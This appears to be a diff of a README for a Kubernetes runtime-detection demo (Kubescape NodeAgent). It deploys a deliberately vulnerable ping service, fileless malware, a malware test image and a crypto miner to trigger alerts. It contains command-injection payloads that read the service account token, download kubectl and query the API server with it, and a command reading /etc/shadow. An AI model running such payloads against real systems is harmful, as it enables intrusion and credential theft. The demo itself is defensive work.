@@ -1,193 +1,414 @@
 # Node Agent Runtime Detection & Response Demo
-This is a walkthrough of Node Agent Runtime Detection & Response capability, in this demo we will do the following:
-1. Install Node Agent.
-2. Deploy a sample web application and attack it.
-3. Deploy fileless malware.
-4. Deploy a container with malicious image that contains malwares.
-5. Deploy an xmrig container to mine cryptocurrency.
-6. See how Node Agent detects the attacks.
 
-With this demo you will be able to see how Node Agent works and how it can be used to detect and prevent attacks.
-To learn more about Node Agent, see [here](https://kubescape.io/docs/).
+<p align="center">
+  <b>🛡️ See NodeAgent detect real attacks in real-time</b>
+</p>
 
-## Table of Contents
+This hands-on demo walks you through NodeAgent's runtime threat detection capabilities. You'll deploy vulnerable applications, execute real attack techniques, and watch NodeAgent detect them instantly.
 
-- [Installation](#installation)
-- [Deploy Web Application](#deploy-web-application)
-- [Attack Web Application](#attack-web-application)
-- [Attack Fileless Malware](#attack-fileless-malware)
-- [Attack Malicious Image](#attack-malicious-image)
-- [Conclusion](#conclusion)
+## 🎯 What You'll Learn
 
+| Demo | Attack Technique | Detection Method |
+|------|-----------------|------------------|
+| [Web App Attack](#-attack-1-web-application-command-injection) | Command Injection (OWASP Top 10) | Unexpected process execution |
+| [Fileless Malware](#-attack-2-fileless-malware) | Memory-only execution | Exec from `/proc/self/fd` |
+| [Malicious Image](#-attack-3-malicious-container-image) | Embedded malware | ClamAV signature detection |
+| [Crypto Mining](#-attack-4-cryptocurrency-mining) | XMRig miner | RandomX instruction detection |
 
-## Installation
-To install Node Agent, you need to have a Kubernetes cluster up and running. In case you want to test it on your local machine you can use [Minikube](https://kubernetes.io/docs/tasks/tools/install-minikube/) or [Kind](https://kind.sigs.k8s.io/docs/user/quick-start/).
+**Time to complete:** ~30 minutes
 
-After you have a Kubernetes cluster up and running, you can install Node Agent by running the following commands:
+## 📖 Table of Contents
 
+- [Prerequisites](#prerequisites)
+- [Installation](#-installation)
+  - [Step 1: Set Up a Cluster](#step-1-set-up-a-cluster)
+  - [Step 2: Install AlertManager (Optional)](#step-2-install-alertmanager-optional)
+  - [Step 3: Install NodeAgent](#step-3-install-nodeagent)
+  - [Step 4: Verify Installation](#step-4-verify-installation)
+- [Attack 1: Web Application Command Injection](#-attack-1-web-application-command-injection)
+- [Attack 2: Fileless Malware](#-attack-2-fileless-malware)
+- [Attack 3: Malicious Container Image](#-attack-3-malicious-container-image)
+- [Attack 4: Cryptocurrency Mining](#-attack-4-cryptocurrency-mining)
+- [Cleanup](#-cleanup)
+- [Next Steps](#-next-steps)
+
+## Prerequisites
+
+- **Kubernetes cluster** (Minikube, Kind, or any cloud provider)
+- **kubectl** configured to access your cluster
+- **Helm** v3.x installed
+- **~15 minutes** for NodeAgent to complete its learning period
+
+## 🚀 Installation
+
+### Step 1: Set Up a Cluster
+
+If you don't have a cluster, create one locally:
+
+**Using Minikube:**
 ```bash
-git clone https://github.com/kubescape/node-agent.git && cd node-agent
-# Assuming AlertManager is running in service  "alertmanager-operated" in namespace "monitoring"
-helm repo add kubescape https://kubescape.github.io/helm-charts/ ; helm repo update ; helm upgrade --install kubescape kubescape/kubescape-operator -n kubescape --create-namespace --set clusterName=`kubectl config current-context` --set nodeAgent.config.alertManagerExporterUrls=alertmanager-operated.monitoring.svc.cluster.local:9093 --set nodeAgent.config.maxLearningPeriod=15m --set nodeAgent.config.learningPeriod=2m --set nodeAgent.config.updatePeriod=1m --set capabilities.runtimeDetection=enable --set alertCRD.installDefault=true --set alertCRD.scopeClustered=true
+minikube start --cpus=4 --memory=8192
 ```
 
-You should be getting alerts after the learning period ends. The learning period is the time Node Agent takes to learn the normal behavior of the cluster, during this period Node Agent will raise alerts only for malicious activities. After the learning period, Node Agent will raise alerts for both malicious and abnormal activities.
-
-The learning period is configurable, you can change the values of `maxLearningPeriod`, `learningPeriod`, and `updatePeriod` in the helm chart. See [here](https://kubescape.io/docs/operator/relevancy/#enabling-relevancy) for more information.
-
-Try `kubectl exec` on one of the Pods after the learning period to test out anomaly detection!
-
-### Getting alerts
-
-One of the ways to get alert from Node Agent is to connect it an AlertManager. If you don't have AlertManager running, you can install it by running the following commands:
+**Using Kind:**
 ```bash
+kind create cluster --name security-demo
+```
+
+### Step 2: Install AlertManager (Optional)
+
+AlertManager provides a UI to view alerts. Skip this if you prefer viewing logs directly.
+
+```bash
+# Add Prometheus community Helm repo
 helm repo add prometheus-community https://prometheus-community.github.io/helm-charts
 helm repo update
-helm install alertmanager prometheus-community/kube-prometheus-stack -n monitoring --create-namespace
+
+# Install kube-prometheus-stack (includes AlertManager)
+helm install alertmanager prometheus-community/kube-prometheus-stack \
+  -n monitoring --create-namespace \
+  --set prometheus.enabled=false \
+  --set grafana.enabled=false
 ```
 
-By default, the Node Agent is exporting alerts to stdout, you can see the alerts by running the following command:
+**Verify AlertManager is running:**
 ```bash
-kubectl logs -n kubescape -l app=node-agent -f
+kubectl get pods -n monitoring -l app.kubernetes.io/name=alertmanager
 ```
 
-In the above helm chart installation, we have connected Node Agent to AlertManager, you can see the alerts in AlertManager UI by going to `http://<node-ip>:9093`.
+**Expected output:**
+```
+NAME                                     READY   STATUS    RESTARTS   AGE
+alertmanager-alertmanager-0              2/2     Running   0          60s
+```
 
-**Once you have Node Agent installed, let's deploy a sample web application and attack it.**
+### Step 3: Install NodeAgent
 
-## Deploy Web Application
-
-To deploy a sample web application, run the following commands:
+Clone this repository and install NodeAgent with Helm:
 
 ```bash
+# Clone the repository
+git clone https://github.com/kubescape/node-agent.git
+cd node-agent
+
+# Install Kubescape with NodeAgent
+helm repo add kubescape https://kubescape.github.io/helm-charts/
+helm repo update
+
+# With AlertManager integration
+helm upgrade --install kubescape kubescape/kubescape-operator \
+  -n kubescape --create-namespace \
+  --set clusterName=$(kubectl config current-context) \
+  --set capabilities.runtimeDetection=enable \
+  --set capabilities.malwareDetection=enable \
+  --set alertCRD.installDefault=true \
+  --set alertCRD.scopeClustered=true \
+  --set nodeAgent.config.alertManagerExporterUrls=alertmanager-operated.monitoring.svc.cluster.local:9093 \
+  --set nodeAgent.config.maxLearningPeriod=15m \
+  --set nodeAgent.config.learningPeriod=2m \
+  --set nodeAgent.config.updatePeriod=1m
+
+# Without AlertManager (alerts go to stdout only)
+# helm upgrade --install kubescape kubescape/kubescape-operator \
+#   -n kubescape --create-namespace \
+#   --set clusterName=$(kubectl config current-context) \
+#   --set capabilities.runtimeDetection=enable \
+#   --set capabilities.malwareDetection=enable \
+#   --set alertCRD.installDefault=true
+```
+
+### Step 4: Verify Installation
+
+```bash
+# Check NodeAgent pods are running
+kubectl get pods -n kubescape -l app=node-agent
+
+# Expected output:
+# NAME               READY   STATUS    RESTARTS   AGE
+# node-agent-xxxxx   1/1     Running   0          60s
+
+# Watch logs for startup messages
+kubectl logs -n kubescape -l app=node-agent -f --tail=50
+```
+
+### ⏱️ Wait for Learning Period
+
+NodeAgent needs ~2 minutes to learn normal cluster behavior. During this time:
+
+- ✅ Malicious activity alerts are generated immediately
+- ⏳ Anomaly detection alerts start after learning completes
+
+**Test that NodeAgent is working:**
+```bash
+# After 2 minutes, run this in any pod:
+kubectl exec -it $(kubectl get pod -o name | head -1) -- cat /etc/shadow 2>/dev/null || echo "Command blocked or file not accessible"
+
+# Check for alerts:
+kubectl logs -n kubescape -l app=node-agent --tail=20 | grep -i alert
+```
+
+---
+
+## 🎯 Attack 1: Web Application Command Injection
+
+This demo shows how attackers exploit command injection vulnerabilities to execute arbitrary commands.
+
+### Deploy the Vulnerable Application
+
+```bash
+# Make setup script executable and run it
 chmod +x demo/general_attack/webapp/setup.sh
 ./demo/general_attack/webapp/setup.sh
+
+# Wait for the pod to be ready
+kubectl wait --for=condition=Ready pod -l app=webapp --timeout=120s
 ```
 
-This will deploy a sample web application and a service to expose it.
-You can access the web application by using a web browser and going to `http://<node-ip>:8080`.
-You should see the following page:
+### Access the Application
+
+```bash
+# Port-forward to access the web app
+kubectl port-forward svc/webapp 8080:8080 &
+
+# Open in browser or use curl
+echo "Open http://localhost:8080 in your browser"
+```
+
+You should see a "Ping Service" application:
+
 ![Web Application](assets/webapp.png)
 
-The application is a "Ping service", it allows the user to ping a host, and it will return the output of the ping command.
-Let's try to ping `1.1.1.1` and see the output.
+### Execute the Attacks
 
-![Ping](assets/ping.png)
+The application concatenates user input directly into a shell command without sanitization.
 
-Once you have the web application up and running, let's attack it and see how Node Agent detects the attack.
-
-## Attack Web Application
-
-Our web application is deliberatly made vulnerable to a [command injection](https://owasp.org/www-community/attacks/Command_Injection) attack.
-
-Behind the scenes, the application is taking the IP from the form as a string and concatenates it to a command. Since there is no proper input sanitization we can use this to run arbitrary commands on the web application container and get the output.
-
-Let's try to execute the `ls` command on the web application container.
-
-```bash
-1.1.1.1;ls
+**Attack 1: List files**
+```
+Input: 1.1.1.1;ls
 ```
 
-Great! We can see the output of the `ls` command, but we can also see that Node Agent detected the attack and sent an alert to AlertManager.
+![ls command](assets/ls.png)
 
-![ls](assets/ls.png)
+**Expected alert:** "Unexpected process launched" or "Unexpected file access"
 
-Navigate to AlertManager UI by going to `http://<node-ip>:9093` and you should see the following alert:
-(You can also see the alert in the terminal where you ran `helm install`)
+**Attack 2: Read service account token**
+```
+Input: 1.1.1.1;cat /run/secrets/kubernetes.io/serviceaccount/token
+```
+
+![Service Account Token](assets/service-account-token.png)
+
+**Expected alert:** "Kubernetes service account token accessed"
+
+**Attack 3: Download and execute kubectl**
+```bash
+# Step 1: Get node architecture
+Input: 1.1.1.1;uname -m | sed 's/x86_64/amd64/g' | sed 's/aarch64/arm64/g'
+
+# Step 2: Download kubectl (replace <arch> with output from step 1)
+Input: 1.1.1.1;curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/<arch>/kubectl"
+
+# Step 3: Make executable
+Input: 1.1.1.1;chmod +x kubectl
+
+# Step 4: Access Kubernetes API
+Input: 1.1.1.1;./kubectl --server https://kubernetes.default --insecure-skip-tls-verify --token $(cat /run/secrets/kubernetes.io/serviceaccount/token) get pods
+```
+
+![kubectl execution](assets/kubectl.png)
+
+**Expected alert:** "Kubernetes API server access detected"
+
+### View Alerts
+
+**Option A: AlertManager UI**
+```bash
+kubectl port-forward svc/alertmanager-operated 9093:9093 -n monitoring &
+echo "Open http://localhost:9093 in your browser"
+```
+
 ![AlertManager](assets/alertmanager.png)
 
-We can see that Node Agent raised two alerts, one for the unexpected command execution and one for the unexpected file activity.
-We can see the details of the alerts such as the command that was executed and the file that was accessed and on which workload.
-
-Now, let's try to run a more malicious command, let's try to get the service account token.
-
+**Option B: NodeAgent logs**
 ```bash
-1.1.1.1;cat /run/secrets/kubernetes.io/serviceaccount/token
+kubectl logs -n kubescape -l app=node-agent -f | grep -E "(ALERT|Rule.*failed)"
 ```
 
-We can see that Node Agent detected the attack and sent an alert to AlertManager.
-![service accout token](assets/service-account-token.png)
-Node Agent detected the attack because it has a rule that identifies access to the service account token.
+---
 
-Next, let's try to download kubectl into the container and run it to get the pods in the cluster.
+## 🎯 Attack 2: Fileless Malware
 
-Execute the following commands one by one:
-```bash
-# Get the architecture of the node
-1.1.1.1;uname -m | sed 's/x86_64/amd64/g' | sed 's/aarch64/arm64/g'
+Fileless malware runs entirely in memory, leaving no files on disk. This makes it extremely difficult to detect with traditional file-based scanners.
 
-# Download kubectl
-1.1.1.1;curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/<node arch>/kubectl"
+### Deploy the Infected Application
 
-# Make kubectl executable
-1.1.1.1;chmod +x kubectl
+We'll deploy Google's [microservices demo](https://github.com/GoogleCloudPlatform/microservices-demo) with one image replaced by a fileless malware sample.
 
-# Get the pods in the cluster
-1.1.1.1;./kubectl --server https://kubernetes.default --insecure-skip-tls-verify --token $(cat /run/secrets/kubernetes.io/serviceaccount/token) get pods
-```
-
-You should see the following output:
-![pods](assets/pods.png)
-
-We can see that Node Agent detected the attack and sent an alert to AlertManager.
-![kubectl](assets/kubectl.png)
-
-Node Agent detected the attack because it has a rule that identifies kubernetes API server access from a container.
-
-## Attack Fileless Malware
-Let's deploy a fileless malware and see how Node Agent detects it.
-
-To deploy the fileless malware, run the following commands:
-This will deploy google's [demo-app](https://github.com/GoogleCloudPlatform/microservices-demo)
 ```bash
 kubectl apply -f demo/fileless_exec/kubernetes-manifest.yaml
+
+# Wait for deployment
+kubectl wait --for=condition=Ready pods --all --timeout=300s
 ```
-We have replaced one of the original images with a malicious image that runs a fileless malware.
-Using the [ezuri crypter](https://github.com/guitmz/ezuri), we have encrypted the malware and embedded it in the image. (Don't worry, it doesn't run a real malicious malware 😉).
 
-Let's see what has popped up in AlertManager.
-![fileless malware](assets/fileless-malware.png)
+> ⚠️ **Note:** The malware is a benign demonstration. It doesn't perform any malicious actions.
 
-We can see that Node Agent detected that an exec syscall was made from `/proc/self/fd/3` which is the file descriptor of the malware that resides in the container's memory.
-This is a fileless malware, so we don't have any files to scan, but Node Agent still detected it.
+### How It Works
 
-## Attack Malicious Image
-Let's deploy a container with malicious image that contains malwares such as [cryptominer](https://www.crowdstrike.com/blog/what-is-cryptomining/) and [webshell](https://owasp.org/www-community/attacks/Web_Shell).
+The malware uses the [Ezuri crypter](https://github.com/guitmz/ezuri) to:
+1. Decrypt the payload in memory
+2. Write it to a memory-backed file descriptor
+3. Execute directly from `/proc/self/fd/3`
 
-We are going to be using [ruzickap malwares container](https://github.com/ruzickap/malware-cryptominer-container) to deploy a container with malwares.
-To deploy the container, run the following command:
+### View the Detection
+
 ```bash
-kubectl run malware-cryptominer --image=quay.io/petr_ruzicka/malware-cryptominer-container:2.0.2
+# Check NodeAgent logs
+kubectl logs -n kubescape -l app=node-agent --tail=100 | grep -i fileless
 ```
-Or, alternatively, you can build the image yourself by running the following commands:
+
+![Fileless Malware Detection](assets/fileless-malware.png)
+
+**Expected alert:** "Exec from malicious source" with path `/proc/self/fd/3`
+
+---
+
+## 🎯 Attack 3: Malicious Container Image
+
+This demo shows NodeAgent's ClamAV-based malware scanning detecting malicious files embedded in container images.
+
+### Deploy the Malicious Container
+
+Using [ruzickap's malware test container](https://github.com/ruzickap/malware-cryptominer-container):
+
 ```bash
-docker build -t malware-cryptominer -f malwares_image/Containerfile .
-docker tag malware-cryptominer quay.io/petr_ruzicka/malware-cryptominer-container:2.0.2
-# If you are using minikube
-minikube image load quay.io/petr_ruzicka/malware-cryptominer-container:2.0.2
-# If you are using kind
-kind load docker-image quay.io/petr_ruzicka/malware-cryptominer-container:2.0.2
+kubectl run malware-cryptominer \
+  --image=quay.io/petr_ruzicka/malware-cryptominer-container:2.0.2
+
+# Wait for the container to start
+kubectl wait --for=condition=Ready pod/malware-cryptominer --timeout=120s
 ```
 
-Let's see what has popped up in AlertManager.
-![malwares](assets/malwares.png)
-We can see that Node Agent detected that the container is running a malicious image that contains malwares.
-It also supplies the path to the malwares in the node's filesystem as well as the signatures of the malwares.
-Node Agent uses [ClamAV](https://www.clamav.net/) to scan the images for malwares.
-ClamAV is an open source antivirus engine for detecting trojans, viruses, malware & other malicious threats, it supports a wide range of signature languages including YARA and bytecode signatures.
+### Alternative: Build Your Own
 
-Please note that Node Agent doesn't scan the images by default, you need to enable it by setting `capabilities.malwareDetection=enable` in the helm chart. See [here](https://kubescape.io/docs/) for more information.
+```bash
+# Build locally
+docker build -t malware-cryptominer -f demo/malwares_image/Containerfile .
 
-## Attack Cryptocurrency Mining
-Let's deploy an xmrig container to mine cryptocurrency and see how Node Agent detects it.
+# Load into your cluster
+# For Minikube:
+minikube image load malware-cryptominer
+
+# For Kind:
+kind load docker-image malware-cryptominer
+```
+
+### View the Detection
+
+```bash
+# Check for malware alerts
+kubectl logs -n kubescape -l app=node-agent --tail=50 | grep -i malware
+```
+
+![Malware Detection](assets/malwares.png)
+
+**Expected alert:** Malware detection with:
+- File path on the node
+- ClamAV signature name
+- Malware type (cryptominer, webshell, etc.)
+
+### About ClamAV Integration
+
+NodeAgent uses [ClamAV](https://www.clamav.net/), an open-source antivirus engine that supports:
+- Signature-based detection
+- YARA rules
+- Bytecode signatures
+- Regular database updates
+
+> 📝 **Note:** Malware detection must be enabled: `--set capabilities.malwareDetection=enable`
+
+---
+
+## 🎯 Attack 4: Cryptocurrency Mining
+
+NodeAgent detects crypto mining by monitoring for RandomX instructions, used by Monero (XMR) miners.
+
+### Deploy the Miner
+
 ```bash
 kubectl apply -f demo/miner/miner-pod.yaml
+
+# Wait for the pod to start
+kubectl wait --for=condition=Ready pod -l app=xmrig --timeout=120s
 ```
-You can see in the logs of the node-agent that it detected the xmrig container and raised an alert. 
 
-## Conclusion
-In this demo we saw how Node Agent can be used to detect and prevent attacks in Kubernetes.
-We covered a few attacks, but Node Agent can detect many more attacks, see [here](https://kubescape.io/docs/) for the full list of supported rules and detection methods.
-To learn more about Node Agent, see [here](../README.md).
+### View the Detection
 
-If you have any questions, feel free to open an issue or contact us via [email](mailto:support@armosec.io) or [slack](https://cloud-native.slack.com/archives/C04EY3ZF9GE).
+```bash
+# Check for mining alerts
+kubectl logs -n kubescape -l app=node-agent --tail=50 | grep -i -E "(miner|mining|randomx|crypto)"
+```
+
+**Expected alert:** "Crypto mining detected" or "RandomX instructions detected"
+
+### How Detection Works
+
+NodeAgent's RandomX tracer monitors for CPU instructions characteristic of the RandomX proof-of-work algorithm:
+- AES-NI instructions in specific patterns
+- Large memory allocation patterns
+- Characteristic computational loops
+
+---
+
+## 🧹 Cleanup
+
+Remove all demo resources:
+
+```bash
+# Remove demo applications
+./demo/general_attack/webapp/cleanup.sh 2>/dev/null || true
+kubectl delete -f demo/fileless_exec/kubernetes-manifest.yaml 2>/dev/null || true
+kubectl delete pod malware-cryptominer 2>/dev/null || true
+kubectl delete -f demo/miner/miner-pod.yaml 2>/dev/null || true
+
+# Remove NodeAgent (optional)
+helm uninstall kubescape -n kubescape
+kubectl delete namespace kubescape
+
+# Remove AlertManager (optional)
+helm uninstall alertmanager -n monitoring
+kubectl delete namespace monitoring
+
+# Stop port-forwards
+pkill -f "kubectl port-forward"
+```
+
+---
+
+## 📚 Next Steps
+
+### Learn More
+
+- 📖 [NodeAgent Documentation](../README.md)
+- 📖 [Kubescape Documentation](https://kubescape.io/docs/)
+- 📖 [Detection Rules Reference](https://kubescape.io/docs/)
+- 📖 [Configuration Guide](../docs/CONFIGURATION.md)
+
+### Advanced Topics
+
+- **Custom Rules:** Create your own detection rules with CEL expressions
+- **Alert Integration:** Connect to PagerDuty, Slack, or your SIEM
+- **Application Profiling:** Fine-tune baseline behavior per application
+- **Seccomp Profiles:** Auto-generate and apply seccomp profiles
+
+### Get Help
+
+- 💬 [CNCF Slack #kubescape](https://cloud-native.slack.com/archives/C04EY3ZF9GE)
+- 🐛 [GitHub Issues](https://github.com/kubescape/node-agent/issues)
+- 📧 [Email Support](mailto:support@armosec.io)
+
+---
+
+<p align="center">
+  <b>Happy hunting! 🎯</b>
+</p>
